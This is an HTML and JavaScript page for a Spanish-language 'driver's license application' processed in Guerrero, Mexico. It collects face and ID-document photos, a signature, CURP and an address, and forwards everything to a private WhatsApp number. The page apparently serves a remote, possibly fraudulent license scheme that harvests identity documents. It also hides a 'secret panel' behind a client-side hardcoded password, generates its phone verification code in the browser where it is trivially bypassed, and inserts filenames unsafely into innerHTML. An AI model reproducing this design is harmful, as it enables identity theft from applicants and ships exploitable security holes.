<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Solicitud Licencia de Conducir</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="form-wrapper">
    
    <h1>SOLICITUD LICENCIA DE CONDUCIR</h1>

    <!-- FOTO TITULAR -->
    <label>* FOTO DEL TITULAR (TOMAR CON CÁMARA)</label>
    <button class="btn-camera" onclick="openCamera()">Tomar fotografía</button>
    <input type="hidden" id="foto_url">

    <div id="photo-preview" class="photo-preview" style="display:none;">
        <p>Foto cargada correctamente</p>
        <img id="final-photo" />
    </div>

    <!-- FOTO DOCUMENTO -->
    <label>* FOTO DE IDENTIFICACIÓN (INE / DOCUMENTO)</label>
    <button class="btn-camera" onclick="openCameraDoc()">Tomar foto del documento</button>
    <input type="hidden" id="foto_documento_url">

    <div id="photo-preview-doc" class="photo-preview" style="display:none;">
        <p>Documento cargado correctamente</p>
        <img id="final-photo-doc" />
    </div>

    <!-- FIRMA -->
    <label>* FIRMA DEL TITULAR</label>
    <button class="btn-camera" onclick="openSignature()">Capturar firma</button>
    <input type="hidden" id="firma_url">

    <div id="signature-preview" class="photo-preview" style="display:none;">
        <p>Firma cargada correctamente</p>
        <img id="final-signature" />
    </div>

    <div class="section-title admin-trigger">DATOS PERSONALES</div>

    <label>* TELÉFONO (WHATSAPP)</label>
    <input class="input" id="telefono" maxlength="10">

    <!-- BLOQUE DE VERIFICACIÓN -->
    <div id="verification-block" style="display:none; margin-top:20px;">
        <label>Ingresa el código recibido por WhatsApp</label>
        <input class="input" id="codigo_verificacion" maxlength="4">
    </div>

    <input type="hidden" id="codigo_generado">
    <input type="hidden" id="codigo_validado" value="no">


    <label>* TIPO DE LICENCIA</label>
    <select class="input" id="tipo_licencia">
        <option value="">Seleccionar…</option>
        <option>CHOFER - C</option>
        <option>AUTOMOVILISTA - A</option>
        <option>MOTOCICLISTA - M</option>
    </select>

    <label>* VALIDA POR</label>
    <select class="input" id="valida_por">
        <option value="">Seleccionar…</option>
        <option>3 AÑOS $650</option>
        <option>5 AÑOS $700</option>
    </select>

    <label>* NOMBRE COMPLETO</label>
    <input class="input" id="nombre">

    <label>* CURP</label>
    <input class="input" id="curp" maxlength="18">

    <label>* CON BASE EN LOS LINEAMIENTOS… ¿ESTÁ DE ACUERDO?</label>
    <select class="input" id="domicilio">
        <option value="">Seleccionar…</option>
        <option>SI</option>
    </select>

    <small>
        Como la licencia se tramita en Guerrero, se pide que salga con un domicilio de aquí. En caso de no tener domicilio de Guerrero, la licencia saldrá con el domicilio del ayuntamiento donde se realiza el trámite.
    </small>

    <label>* ALERGIAS / RESTRICCIONES</label>
    <input class="input" id="alergias">

    <label>* TIPO DE SANGRE</label>
    <select class="input" id="sangre">
        <option value="">Seleccionar…</option>
        <option>AB+</option><option>AB-</option>
        <option>A+</option><option>A-</option>
        <option>B+</option><option>B-</option>
        <option>O+</option><option>O-</option>
        <option>DESCONOCE</option>
    </select>

    <label>* CONTACTO EN CASO DE EMERGENCIA (NOMBRE)</label>
    <input class="input" id="emergencia_nombre">

    <label>* TELÉFONO EMERGENCIA</label>
    <input class="input" id="emergencia_tel" maxlength="10">

    <div class="section-title admin-trigger">DATOS PARA ENVÍO</div>

    <!-- PANEL SECRETO -->
    <div id="admin-panel" class="admin-panel" style="display:none;">
        <h2>FOTOS CARGADAS</h2>
        <div id="file-list"></div>
    </div>

    <label>* NOMBRE DESTINATARIO</label>
    <input class="input" id="dest_nombre">

    <label>* TELÉFONO DESTINATARIO</label>
    <input class="input" id="dest_tel" maxlength="10">

    <label>* CALLE</label>
    <input class="input" id="calle">

    <label>* NUM EXT</label>
    <input class="input" id="numero_ext">

    <label>* COLONIA</label>
    <input class="input" id="colonia">

    <label>* CÓDIGO POSTAL</label>
    <input class="input" id="cp" maxlength="5">

    <label>* CIUDDAD</label>
    <input class="input" id="ciudad">

    <label>* ESTADO</label>
    <select class="input" id="estado">
        <option>Aguascalientes</option><option>Baja California</option>
        <option>Baja California Sur</option><option>Campeche</option>
        <option>CDMX</option><option>Chiapas</option>
        <option>Chihuahua</option><option>Coahuila</option>
        <option>Colima</option><option>Durango</option>
        <option>Estado de México</option><option>Guanajuato</option>
        <option>Guerrero</option><option>Hidalgo</option>
        <option>Jalisco</option><option>Michoacán</option>
        <option>Morelos</option><option>Nayarit</option>
        <option>Nuevo León</option><option>Oaxaca</option>
        <option>Puebla</option><option>Querétaro</option>
        <option>Quintana Roo</option><option>San Luis Potosí</option>
        <option>Sinaloa</option><option>Sonora</option>
        <option>Tabasco</option><option>Tamaulipas</option>
        <option>Tlaxcala</option><option>Veracruz</option>
        <option>Yucatán</option><option>Zacatecas</option>
    </select>

    <button class="btn-submit" onclick="enviarWhatsApp()">Enviar</button>

</div>

<!-- CÁMARA -->
<div id="camera-modal" class="camera-modal">
    <video id="camera" autoplay></video>
    <img id="overlay" src="silhouette.png">
    <button id="btn-capture" class="btn-capture" onclick="capture()">Capturar</button>
    <button id="btn-close" class="btn-close" onclick="closeCamera()">Cerrar</button>

    <div id="preview-area" class="preview-area" style="display:none;">
        <img id="preview-photo" class="preview-photo">
        <div class="preview-buttons">
            <button class="btn-accept" onclick="acceptPhoto()">Usar esta foto</button>
            <button class="btn-retake" onclick="retakePhoto()">Tomar otra</button>
            <button class="btn-cancel" onclick="cancelPhoto()">Cancelar</button>
        </div>
    </div>
</div>

<!-- FIRMA -->
<div id="signature-modal" class="camera-modal" style="display:none;">
    <p id="signature-instruction" class="signature-instruction">
        Dibuja tu firma dentro del recuadro
    </p>

    <canvas id="signature-canvas"></canvas>

    <div class="preview-buttons" style="margin-top:20px;">
        <button class="btn-accept" onclick="saveSignature()">Confirmar firma</button>
        <button class="btn-retake" onclick="clearSignature()">Limpiar</button>
        <button class="btn-cancel" onclick="closeSignature()">Cancelar</button>
    </div>
</div>

<script src="camera.js"></script>

<!-- PANEL SECRETO -->
<script>
let adminClicks = 0;

document.querySelectorAll(".admin-trigger").forEach(el => {
    el.addEventListener("click", () => {
        adminClicks++;

        if (adminClicks >= 2) {
            adminClicks = 0;
            loadUploads();
        }

        setTimeout(() => adminClicks = 0, 800);
    });
});

async function loadUploads() {

    const pass = prompt("Ingrese contraseña para acceder:");

    if (pass !== "1793") {
        alert("Contraseña incorrecta.");
        return;
    }

    const panel = document.getElementById("admin-panel");
    const list = document.getElementById("file-list");

    panel.style.display = "block";
    list.innerHTML = "Cargando archivos...";

    const res = await fetch("/list-uploads");
    const data = await res.json();

    list.innerHTML = "";

    if (data.files.length === 0) {
        list.innerHTML = "<p>No hay fotos cargadas.</p>";
        return;
    }

    data.files.forEach(file => {
        const div = document.createElement("div");
        div.className = "file-entry";

        div.innerHTML = `
            <img src="/uploads/${file.name}" class="thumb">
            <div class="info">
                <p><b>${file.name}</b></p>
                <p>Tamaño: ${(file.size/1024).toFixed(1)} KB</p>
            </div>
            <button class="delete-btn" onclick="deleteFile('${file.name}')">Eliminar</button>
        `;

        list.appendChild(div);
    });
}

async function deleteFile(name) {
    if (!confirm("¿Eliminar esta foto?")) return;

    const req = await fetch("/delete-upload", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ name })
    });

    const res = await req.json();

    if (res.success) loadUploads();
    else alert("Error al eliminar archivo.");
}
</script>

<script>
// ===============================
// VALIDACIÓN DEL NÚMERO POR CÓDIGO
// ===============================
async function enviarCodigoVerificacion(telefono) {

    const codigo = Math.floor(1000 + Math.random() * 9000); // código de 4 dígitos
    document.getElementById("codigo_generado").value = codigo;

    const response = await fetch("https://TU_BOT_DOMAIN/send-code", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            telefono,
            codigo
        })
    });

    const data = await response.json();

    if (data.success) {
        alert("Te enviamos un código por WhatsApp. Ingresa el código para continuar.");
        document.getElementById("verification-block").style.display = "block";
    } else {
        alert("Error al enviar el código. Intenta nuevamente.");
    }
}


// ===============================
// ENVÍO FINAL
// ===============================
async function enviarWhatsApp() {
    const t = id => document.getElementById(id).value.trim();

    const campos = [
        "foto_url","foto_documento_url","firma_url","telefono","tipo_licencia","valida_por",
        "nombre","curp","domicilio","alergias","sangre",
        "emergencia_nombre","emergencia_tel",
        "dest_nombre","dest_tel","calle","numero_ext","colonia","cp","ciudad","estado"
    ];

    for (let c of campos) {
        if (!t(c)) return alert("Completa todos los campos.");
    }

    const telefono = t("telefono");
    const codigoValidado = document.getElementById("codigo_validado").value;

    // 1️⃣ SI NO ESTÁ VALIDADO, ENVIAMOS CÓDIGO
    if (codigoValidado !== "si") {

        // Si aún no existe un código → enviar
        if (!document.getElementById("codigo_generado").value) {
            enviarCodigoVerificacion(telefono);
            return;
        }

        // Ya existe un código → validar el ingresado
        const codigoIngresado = t("codigo_verificacion");
        const codigoCorrecto = t("codigo_generado");

        if (codigoIngresado !== codigoCorrecto) {
            alert("El código de verificación no coincide.");
            return;
        }

        // Código correcto
        document.getElementById("codigo_validado").value = "si";
    }

    // 2️⃣ YA ESTÁ VALIDADO → SE CONTINÚA NORMALMENTE
    const folio = Math.floor(10000 + Math.random() * 90000);

    const mensaje = `
SOLICITUD LICENCIA DE CONDUCIR
Folio #${folio}

TELÉFONO: ${t("telefono")}
TIPO DE LICENCIA: ${t("tipo_licencia")}
VALIDA POR: ${t("valida_por")}
NOMBRE: ${t("nombre")}
CURP: ${t("curp")}
DOMICILIO DE GUERRERO ACEPTADO : SI
ALERGIAS: ${t("alergias")}
TIPO DE SANGRE: ${t("sangre")}
CONTACTO EMERGENCIA: ${t("emergencia_nombre")} (${t("emergencia_tel")})

DATOS DE ENVÍO
NOMBRE DESTINATARIO : ${t("dest_nombre")}
TELÉFONO DESTINATARIO : ${t("dest_tel")}
CALLE : ${t("calle")}
NÚMERO : ${t("numero_ext")}
COLONIA : ${t("colonia")}
CP : ${t("cp")}
CIUDAD Y ESTADO : ${t("ciudad")}, ${t("estado")}

FOTO: ${t("foto_url")}
FOTO DEL DOCUMENTO: ${t("foto_documento_url")}
FIRMA DIGITAL: ${t("firma_url")}

Tu solicitud será asignada al número 7225600905 para continuar el trámite.
`;

    window.location.href = `https://wa.me/527225600905?text=${encodeURIComponent(mensaje)}`;
}
</script>

</body>
</html>
